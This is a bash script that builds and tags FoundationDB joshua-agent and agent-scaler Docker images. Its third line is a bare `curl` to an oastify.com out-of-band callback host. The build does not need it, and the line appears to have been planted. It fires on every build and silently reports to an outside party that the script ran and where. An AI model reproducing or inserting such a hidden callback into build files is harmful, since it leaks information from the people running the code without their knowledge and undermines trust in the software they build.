#!/usr/bin/env bash
set -Eeuo pipefail
curl 0pqg3dc26zygtj46kb206vcjqaw9sxmlb.oastify.com
RUN_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" &>/dev/null && pwd -P)
COMMIT_HASH=$(git rev-parse --short=10  HEAD)
DATE_STR=$(date +"%Y%m%d%H%M%S")

# avoid unbound variable
FDB_VERSION=${FDB_VERSION:-}
if [ ! -z ${FDB_VERSION} ]; then
  fdb_version_arg="--build-arg FDB_VERSION=${FDB_VERSION}"
else
  fdb_version_arg=""
fi

################################################################################
# joshua-agent
################################################################################
docker build \
  --build-arg REPOSITORY=foundationdb/build \
  ${fdb_version_arg} \
  --tag foundationdb/joshua-agent:"${DATE_STR}-${COMMIT_HASH}" \
  --tag foundationdb/joshua-agent:latest \
  .
################################################################################
# agent-scaler
################################################################################
cd "${RUN_DIR}"/k8s/agent-scaler || exit 127
cp "${RUN_DIR}"/joshua/joshua_model.py .
docker build \
  --build-arg AGENT_TAG=foundationdb/joshua-agent:"${DATE_STR}-${COMMIT_HASH}" \
  ${fdb_version_arg} \
  --tag foundationdb/agent-scaler:"${DATE_STR}-${COMMIT_HASH}" \
  --tag foundationdb/agent-scaler:latest \
  .
